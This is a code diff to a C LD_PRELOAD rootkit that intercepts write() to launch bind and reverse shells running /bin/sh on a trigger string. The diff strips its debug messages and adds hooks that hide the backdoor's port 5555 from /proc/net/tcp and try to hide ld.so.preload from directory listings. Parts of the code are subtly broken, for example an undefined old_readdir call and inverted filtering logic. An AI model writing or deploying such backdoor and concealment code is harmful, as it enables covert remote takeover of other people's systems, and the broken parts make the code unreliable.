@@ -16,7 +16,7 @@
 
 
 int TCP_IP_BIND_SHELL(void){
-    printf("Starting TCP/IP Reverse Shell..\n");
+
     int listening_socket = socket(AF_INET, SOCK_STREAM, 0);
 
     struct sockaddr_in server_addr;
@@ -29,8 +29,7 @@ int TCP_IP_BIND_SHELL(void){
     listen(listening_socket, 5);
 
     int accepted_socket = accept(listening_socket, NULL, NULL);
-    
-    if(accepted_socket < 0) printf("Error creating socket!\n");
+
     for(int i = 0; i < 3; i++){
         dup2(accepted_socket, i);
     }
@@ -67,9 +66,9 @@ int TCP_IP_REVERSE_SHELL(void){
     execve("/bin/sh", args, NULL);
     close(listening_socket);
 }
+
 ssize_t write(int fildes, const void *buf, size_t nbytes)
 {
-    printf("Intercepted write call...\n");
 	ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
 
 	ssize_t result;
@@ -80,7 +79,6 @@ ssize_t write(int fildes, const void *buf, size_t nbytes)
     char* malConnectReverse = strstr(buf, REVERSE_KEY);
 
     if(malConnectBind != NULL){
-        printf("recognized buffer\n");
         fildes = open("dev/null", O_WRONLY | O_APPEND);
         result = new_write(fildes, buf, nbytes);
         TCP_IP_BIND_SHELL();
@@ -95,3 +93,44 @@ ssize_t write(int fildes, const void *buf, size_t nbytes)
 	return result;
 }
 
+FILE *(*orig_fopen)(const char *pathname, const char *mode);
+FILE* fopen(const char *pathname, const char *mode){
+
+    orig_fopen = dlsym(RTLD_NEXT, "fopen");
+    
+    char* procTCPptr = strstr(pathname, "/proc/net/tcp");
+    
+    FILE* fp;
+
+    if(procTCPptr != NULL){
+        char* networkLine[400];
+        FILE *ret = tmpfile();
+        fp = orig_fopen(pathname, mode);
+        while(fgets(networkLine, sizeof(networkLine), fp)){
+            char* malPort = strstr(networkLine, "5555");
+            if(malPort == NULL){
+                fputs(networkLine, ret);
+            }
+            else continue;
+        }
+        return ret;
+    }
+
+    fp = orig_fopen(pathname, mode);
+    return fp;
+}
+
+struct dirent*(*orig_readdir)(DIR *directory);
+struct dirent *readdir(DIR *dirp){
+
+    orig_readdir = dlsym(RTLD_NEXT, "readdir");
+
+    struct dirent *directory;
+
+    while(directory = old_readdir(dirp)){
+        if(strstr(directory -> d_name, "ld.so.preload") == 0) break;
+    }
+
+    return  directory;
+
+}
